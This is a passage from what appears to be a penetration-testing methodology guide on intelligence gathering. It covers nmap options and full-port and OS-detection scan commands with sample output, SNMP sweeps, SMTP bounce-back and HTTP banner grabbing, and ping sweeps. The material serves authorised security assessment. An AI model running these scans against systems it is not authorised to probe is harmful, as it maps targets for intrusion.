  <span class="o">-</span><span class="n">g</span><span class="o">/--</span><span class="n">source</span><span class="o">-</span><span class="n">port</span> <span class="o">&lt;</span><span class="n">portnum</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Use</span> <span class="n">given</span> <span class="n">port</span> <span class="n">number</span>
  <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">length</span> <span class="o">&lt;</span><span class="n">num</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Append</span> <span class="n">random</span> <span class="n">data</span> <span class="n">to</span> <span class="n">sent</span> <span class="n">packets</span>
  <span class="o">--</span><span class="n">ip</span><span class="o">-</span><span class="n">options</span> <span class="o">&lt;</span><span class="n">options</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="k">with</span> <span class="n">specified</span> <span class="n">ip</span> <span class="n">options</span>
  <span class="o">--</span><span class="n">ttl</span> <span class="o">&lt;</span><span class="n">val</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Set</span> <span class="n">IP</span> <span class="n">time</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">live</span> <span class="n">field</span>
  <span class="o">--</span><span class="n">spoof</span><span class="o">-</span><span class="n">mac</span> <span class="o">&lt;</span><span class="n">mac</span> <span class="n">address</span><span class="o">/</span><span class="n">prefix</span><span class="o">/</span><span class="n">vendor</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Spoof</span> <span class="n">your</span> <span class="n">MAC</span> <span class="n">address</span>
  <span class="o">--</span><span class="n">badsum</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="k">with</span> <span class="n">a</span> <span class="n">bogus</span> <span class="n">TCP</span><span class="o">/</span><span class="n">UDP</span><span class="o">/</span><span class="n">SCTP</span> <span class="n">checksum</span>
<span class="n">OUTPUT</span><span class="p">:</span>
  <span class="o">-</span><span class="n">oN</span><span class="o">/-</span><span class="n">oX</span><span class="o">/-</span><span class="n">oS</span><span class="o">/-</span><span class="n">oG</span> <span class="o">&lt;</span><span class="n">file</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Output</span> <span class="n">scan</span> <span class="ow">in</span> <span class="n">normal</span><span class="p">,</span> <span class="n">XML</span><span class="p">,</span> <span class="n">s</span><span class="o">|&lt;</span><span class="n">rIpt</span> <span class="n">kIddi3</span><span class="p">,</span>
     <span class="ow">and</span> <span class="n">Grepable</span> <span class="nb">format</span><span class="p">,</span> <span class="n">respectively</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">given</span> <span class="n">filename</span><span class="o">.</span>
  <span class="o">-</span><span class="n">oA</span> <span class="o">&lt;</span><span class="n">basename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Output</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">three</span> <span class="n">major</span> <span class="n">formats</span> <span class="n">at</span> <span class="n">once</span>
  <span class="o">-</span><span class="n">v</span><span class="p">:</span> <span class="n">Increase</span> <span class="n">verbosity</span> <span class="n">level</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">vv</span> <span class="ow">or</span> <span class="n">more</span> <span class="k">for</span> <span class="n">greater</span> <span class="n">effect</span><span class="p">)</span>
  <span class="o">-</span><span class="n">d</span><span class="p">:</span> <span class="n">Increase</span> <span class="n">debugging</span> <span class="n">level</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">dd</span> <span class="ow">or</span> <span class="n">more</span> <span class="k">for</span> <span class="n">greater</span> <span class="n">effect</span><span class="p">)</span>
  <span class="o">--</span><span class="n">reason</span><span class="p">:</span> <span class="n">Display</span> <span class="n">the</span> <span class="n">reason</span> <span class="n">a</span> <span class="n">port</span> <span class="ow">is</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">particular</span> <span class="n">state</span>
  <span class="o">--</span><span class="nb">open</span><span class="p">:</span> <span class="n">Only</span> <span class="n">show</span> <span class="nb">open</span> <span class="p">(</span><span class="ow">or</span> <span class="n">possibly</span> <span class="nb">open</span><span class="p">)</span> <span class="n">ports</span>
  <span class="o">--</span><span class="n">packet</span><span class="o">-</span><span class="n">trace</span><span class="p">:</span> <span class="n">Show</span> <span class="nb">all</span> <span class="n">packets</span> <span class="n">sent</span> <span class="ow">and</span> <span class="n">received</span>
  <span class="o">--</span><span class="n">iflist</span><span class="p">:</span> <span class="n">Print</span> <span class="n">host</span> <span class="n">interfaces</span> <span class="ow">and</span> <span class="n">routes</span> <span class="p">(</span><span class="k">for</span> <span class="n">debugging</span><span class="p">)</span>
  <span class="o">--</span><span class="n">log</span><span class="o">-</span><span class="n">errors</span><span class="p">:</span> <span class="n">Log</span> <span class="n">errors</span><span class="o">/</span><span class="n">warnings</span> <span class="n">to</span> <span class="n">the</span> <span class="n">normal</span><span class="o">-</span><span class="nb">format</span> <span class="n">output</span> <span class="n">file</span>
  <span class="o">--</span><span class="n">append</span><span class="o">-</span><span class="n">output</span><span class="p">:</span> <span class="n">Append</span> <span class="n">to</span> <span class="n">rather</span> <span class="n">than</span> <span class="n">clobber</span> <span class="n">specified</span> <span class="n">output</span> <span class="n">files</span>
  <span class="o">--</span><span class="n">resume</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Resume</span> <span class="n">an</span> <span class="n">aborted</span> <span class="n">scan</span>
  <span class="o">--</span><span class="n">stylesheet</span> <span class="o">&lt;</span><span class="n">path</span><span class="o">/</span><span class="n">URL</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">XSL</span> <span class="n">stylesheet</span> <span class="n">to</span> <span class="n">transform</span> <span class="n">XML</span> <span class="n">output</span> <span class="n">to</span> <span class="n">HTML</span>
  <span class="o">--</span><span class="n">webxml</span><span class="p">:</span> <span class="n">Reference</span> <span class="n">stylesheet</span> <span class="kn">from</span> <span class="nn">Nmap.Org</span> <span class="k">for</span> <span class="n">more</span> <span class="n">portable</span> <span class="n">XML</span>
  <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">stylesheet</span><span class="p">:</span> <span class="n">Prevent</span> <span class="n">associating</span> <span class="n">of</span> <span class="n">XSL</span> <span class="n">stylesheet</span> <span class="n">w</span><span class="o">/</span><span class="n">XML</span> <span class="n">output</span>
<span class="n">MISC</span><span class="p">:</span>
  <span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">IPv6</span> <span class="n">scanning</span>
  <span class="o">-</span><span class="n">A</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">OS</span> <span class="n">detection</span><span class="p">,</span> <span class="n">version</span> <span class="n">detection</span><span class="p">,</span> <span class="n">script</span> <span class="n">scanning</span><span class="p">,</span> <span class="ow">and</span> <span class="n">traceroute</span>
  <span class="o">--</span><span class="n">datadir</span> <span class="o">&lt;</span><span class="n">dirname</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Specify</span> <span class="n">custom</span> <span class="n">Nmap</span> <span class="n">data</span> <span class="n">file</span> <span class="n">location</span>
  <span class="o">--</span><span class="n">send</span><span class="o">-</span><span class="n">eth</span><span class="o">/--</span><span class="n">send</span><span class="o">-</span><span class="n">ip</span><span class="p">:</span> <span class="n">Send</span> <span class="n">using</span> <span class="n">raw</span> <span class="n">ethernet</span> <span class="n">frames</span> <span class="ow">or</span> <span class="n">IP</span> <span class="n">packets</span>
  <span class="o">--</span><span class="n">privileged</span><span class="p">:</span> <span class="n">Assume</span> <span class="n">that</span> <span class="n">the</span> <span class="n">user</span> <span class="ow">is</span> <span class="n">fully</span> <span class="n">privileged</span>
  <span class="o">--</span><span class="n">unprivileged</span><span class="p">:</span> <span class="n">Assume</span> <span class="n">the</span> <span class="n">user</span> <span class="n">lacks</span> <span class="n">raw</span> <span class="n">socket</span> <span class="n">privileges</span>
  <span class="o">-</span><span class="n">V</span><span class="p">:</span> <span class="n">Print</span> <span class="n">version</span> <span class="n">number</span>
  <span class="o">-</span><span class="n">h</span><span class="p">:</span> <span class="n">Print</span> <span class="n">this</span> <span class="n">help</span> <span class="n">summary</span> <span class="n">page</span><span class="o">.</span>
<span class="n">EXAMPLES</span><span class="p">:</span>
  <span class="n">nmap</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">A</span> <span class="n">scanme</span><span class="o">.</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span>
  <span class="n">nmap</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">sn</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">16</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">8</span>
  <span class="n">nmap</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">iR</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span>
<span class="n">SEE</span> <span class="n">THE</span> <span class="n">MAN</span> <span class="n">PAGE</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">book</span><span class="o">/</span><span class="n">man</span><span class="o">.</span><span class="n">html</span><span class="p">)</span> <span class="n">FOR</span> <span class="n">MORE</span> <span class="n">OPTIONS</span> <span class="n">AND</span> <span class="n">EXAMPLES</span>
</pre></div>
</div>
<p>Nmap has dozens of options available. Since this section is dealing with
port scanning, we will focus on the commands required to perform this
task. It is important to note that the commands utilized depend mainly
on the time and number of hosts being scanned. The more hosts or less
time that you have to perform this tasks, the less that we will
interrogate the host. This will become evident as we continue to discuss
the options.</p>
<div class="line-block">
<div class="line">Based on the IP set being assessed you would want to scan both the TCP
and UDP ports across the range 1 to 65535. The command that will be
utilized is as follows:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">PN</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">T2</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1</span><span class="o">-</span><span class="mi">65535</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">ip</span> <span class="nb">range</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;/&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">CIDR</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="ow">or</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">Mask</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">oA</span> <span class="n">NMap_FULL_</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">ip</span> <span class="nb">range</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">PN</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">T2</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1</span><span class="o">-</span><span class="mi">65535</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">oA</span> <span class="n">NMap_FULL_client</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span> <span class="n">Eastern</span> <span class="n">Daylight</span> <span class="n">Time</span>

<span class="n">NSE</span><span class="p">:</span> <span class="n">Loaded</span> <span class="mi">57</span> <span class="n">scripts</span> <span class="k">for</span> <span class="n">scanning</span><span class="o">.</span>
<span class="n">Initiating</span> <span class="n">Parallel</span> <span class="n">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">host</span><span class="o">.</span> <span class="n">at</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span>
<span class="n">Completed</span> <span class="n">Parallel</span> <span class="n">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">host</span><span class="o">.</span> <span class="n">at</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span><span class="p">,</span> <span class="mf">0.10</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="n">Initiating</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span>
<span class="n">Scanning</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">74.117</span><span class="o">.</span><span class="mf">116.73</span><span class="p">)</span> <span class="p">[</span><span class="mi">65535</span> <span class="n">ports</span><span class="p">]</span>
<span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">74.117</span><span class="o">.</span><span class="mf">116.73</span>
</pre></div>
</div>
<div class="line-block">
<div class="line">On large IP sets, those greater than 100 IP addresses, do not specify
a port range. The command that will be utilized is as follows:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">O</span> <span class="o">-</span><span class="n">PN</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">ip</span> <span class="nb">range</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;/&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">CIDR</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="ow">or</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">Mask</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">oA</span> <span class="n">NMap_</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">client</span> <span class="n">ip</span> <span class="nb">range</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">O</span> <span class="o">-</span><span class="n">PN</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">oA</span> <span class="n">NMap_client</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="p">:</span><span class="mi">37</span> <span class="n">Eastern</span> <span class="n">Daylight</span> <span class="n">Time</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">74.117</span><span class="o">.</span><span class="mf">116.73</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.13</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">rDNS</span> <span class="n">record</span> <span class="k">for</span> <span class="mf">74.117</span><span class="o">.</span><span class="mf">116.73</span><span class="p">:</span> <span class="mi">74</span><span class="o">-</span><span class="mi">117</span><span class="o">-</span><span class="mi">116</span><span class="o">-</span><span class="mf">73.</span><span class="n">parked</span><span class="o">.</span><span class="n">com</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">999</span> <span class="n">filtered</span> <span class="n">ports</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.2</span><span class="o">.</span><span class="mi">3</span> <span class="p">((</span><span class="n">CentOS</span><span class="p">))</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">robots</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span> <span class="mi">2</span> <span class="n">disallowed</span> <span class="n">entries</span>
<span class="o">|</span><span class="n">_</span><span class="o">/</span><span class="n">click</span><span class="o">.</span><span class="n">php</span> <span class="o">/</span><span class="n">ud</span><span class="o">.</span><span class="n">php</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> <span class="n">No</span> <span class="n">Allow</span> <span class="ow">or</span> <span class="n">Public</span> <span class="n">header</span> <span class="ow">in</span> <span class="n">OPTIONS</span> <span class="n">response</span> <span class="p">(</span><span class="n">status</span> <span class="n">code</span> <span class="mi">200</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">favicon</span><span class="p">:</span> <span class="n">Parked</span><span class="o">.</span><span class="n">com</span> <span class="n">domain</span> <span class="n">parking</span>
<span class="ne">Warning</span><span class="p">:</span> <span class="n">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="n">o</span>
<span class="n">pen</span> <span class="ow">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
<span class="n">Device</span> <span class="nb">type</span><span class="p">:</span> <span class="n">general</span> <span class="n">purpose</span>
<span class="n">Running</span> <span class="p">(</span><span class="n">JUST</span> <span class="n">GUESSING</span><span class="p">):</span> <span class="n">Linux</span> <span class="mf">2.6</span><span class="o">.</span><span class="n">X</span> <span class="p">(</span><span class="mi">92</span><span class="o">%</span><span class="p">),</span> <span class="n">OpenBSD</span> <span class="mf">4.</span><span class="n">X</span> <span class="p">(</span><span class="mi">88</span><span class="o">%</span><span class="p">),</span> <span class="n">FreeBSD</span> <span class="mf">6.</span><span class="n">X</span> <span class="p">(</span><span class="mi">88</span><span class="o">%</span><span class="p">)</span>
</pre></div>
</div>
<p>It should be noted that Nmap has limited options for IPv6. These include
TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version
detection.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="mi">6</span> <span class="o">-</span><span class="n">sT</span> <span class="o">-</span><span class="n">P0</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">80</span><span class="n">a5</span><span class="p">:</span><span class="mi">26</span><span class="n">f2</span><span class="p">:</span><span class="mi">8</span><span class="n">db7</span><span class="p">:</span><span class="mi">5</span><span class="n">d04</span><span class="o">%</span><span class="mi">12</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2011</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="p">:</span><span class="mi">42</span> <span class="n">Eastern</span> <span class="n">Daylight</span> <span class="n">Time</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">lancelot</span> <span class="p">(</span><span class="n">fe80</span><span class="p">::</span><span class="mi">80</span><span class="n">a5</span><span class="p">:</span><span class="mi">26</span><span class="n">f2</span><span class="p">:</span><span class="mi">8</span><span class="n">db7</span><span class="p">:</span><span class="mi">5</span><span class="n">d04</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">1.0</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">988</span> <span class="n">closed</span> <span class="n">ports</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
<span class="mi">554</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">rtsp</span>
<span class="mi">2869</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">icslap</span>
<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">term</span><span class="o">-</span><span class="n">serv</span>
<span class="mi">5000</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">upnp</span>
<span class="mi">5001</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">commplex</span><span class="o">-</span><span class="n">link</span>
<span class="mi">5002</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">rfe</span>
<span class="mi">5003</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">filemaker</span>
<span class="mi">5004</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">avt</span><span class="o">-</span><span class="n">profile</span><span class="o">-</span><span class="mi">1</span>
<span class="mi">5357</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">wsdapi</span>
<span class="mi">10243</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">287.05</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="snmp-sweeps">
<h5>SNMP Sweeps<a class="headerlink" href="#snmp-sweeps" title="Permalink to this headline">¶</a></h5>
<p>SNMP sweeps are performed too as they offer tons of information about a
specific system. The SNMP protocol is a stateless, datagram oriented
protocol. Unfortunately SNMP servers don&#8217;t respond to requests with
invalid community strings and the underlying UDP protocol does not
reliably report closed UDP ports. This means that &#8220;no response&#8221; from a
probed IP address can mean either of the following:</p>
<ul class="simple">
<li>machine unreachable</li>
<li>SNMP server not running</li>
<li>invalid community string</li>
<li>the response datagram has not yet arrived</li>
</ul>
<p>SNMPEnum (Linux)</p>
<p>SNMPEnum is a perl script that sends SNMP requests to a single host,
then waits for the response to come back and logs them.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_37.png">Screenshot Here</a></p>
</div>
<div class="section" id="smtp-bounce-back">
<h5>SMTP Bounce Back<a class="headerlink" href="#smtp-bounce-back" title="Permalink to this headline">¶</a></h5>
<p>SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a
(failed) Delivery Status Notification (DSN) message, a Non-Delivery
Notification (NDN) or simply a bounce, is an automated electronic mail
message from a mail system informing the sender of another message about
a delivery problem. This can be used to assist an attacker in
fingerprint the SMTP server as SMTP server information, including
software and versions, may be included in a bounce message.</p>
</div>
<div class="section" id="banner-grabbing">
<h5>Banner Grabbing<a class="headerlink" href="#banner-grabbing" title="Permalink to this headline">¶</a></h5>
<p>Banner Grabbing is an enumeration technique used to glean information
about computer systems on a network and the services running its open
ports. Banner grabbing is used to identify network the version of
applications and operating system that the target host are running.</p>
<p>Banner grabbing is usually performed on Hyper Text Transfer Protocol
(HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol
(SMTP); ports 80, 21, and 25 respectively. Tools commonly used to
perform banner grabbing are Telnet, nmap, and Netcat.</p>
<p>HTTP</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">JUNK</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span>

<span class="n">HEAD</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">9.3</span>

<span class="n">OPTIONS</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span>

<span class="n">HEAD</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.0</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="internal-footprinting">
<h3>Internal Footprinting<a class="headerlink" href="#internal-footprinting" title="Permalink to this headline">¶</a></h3>
<p>The Internal Footprinting phase of Intelligence Gathering involves
gathering response results from a target based upon direct interaction
from an internal perspective. The goal is to gather as much information
about the target as possible.</p>
<div class="section" id="id1">
<h4>Active Footprinting<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
<p>The active footprinting phase of Intelligence Gathering involves
gathering response results from a target based upon direct interaction.</p>
<div class="section" id="ping-sweeps">
<h5>Ping Sweeps<a class="headerlink" href="#ping-sweeps" title="Permalink to this headline">¶</a></h5>
<p>Active footprinting begins with the identification of live systems. This
is usually performed by conducting a Ping sweep to determine which hosts
respond.</p>
<p>Nmap (Windows/Linux)</p>
<p>Nmap (&#8220;Network Mapper&#8221;) is the de facto standard for network
auditing/scanning. Nmap runs on both Linux and Windows. Nmap is
available in both command line and GUI versions. For the sake of this
document, we will only cover the command line.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span>
<span class="n">Usage</span><span class="p">:</span> <span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>
<span class="n">TARGET</span> <span class="n">SPECIFICATION</span><span class="p">:</span>
  <span class="n">Can</span> <span class="k">pass</span> <span class="n">hostnames</span><span class="p">,</span> <span class="n">IP</span> <span class="n">addresses</span><span class="p">,</span> <span class="n">networks</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span>
  <span class="n">Ex</span><span class="p">:</span> <span class="n">scanme</span><span class="o">.</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="p">,</span> <span class="n">microsoft</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="mi">24</span><span class="p">,</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.1</span><span class="p">;</span> <span class="mf">10.0</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mf">255.1</span><span class="o">-</span><span class="mi">254</span>
  <span class="o">-</span><span class="n">iL</span> <span class="o">&lt;</span><span class="n">inputfilename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Input</span> <span class="kn">from</span> <span class="nn">list</span> <span class="n">of</span> <span class="n">hosts</span><span class="o">/</span><span class="n">networks</span>
  <span class="o">-</span><span class="n">iR</span> <span class="o">&lt;</span><span class="n">num</span> <span class="n">hosts</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Choose</span> <span class="n">random</span> <span class="n">targets</span>
  <span class="o">--</span><span class="n">exclude</span> <span class="o">&lt;</span><span class="n">host1</span><span class="p">[,</span><span class="n">host2</span><span class="p">][,</span><span class="n">host3</span><span class="p">],</span><span class="o">...&gt;</span><span class="p">:</span> <span class="n">Exclude</span> <span class="n">hosts</span><span class="o">/</span><span class="n">networks</span>
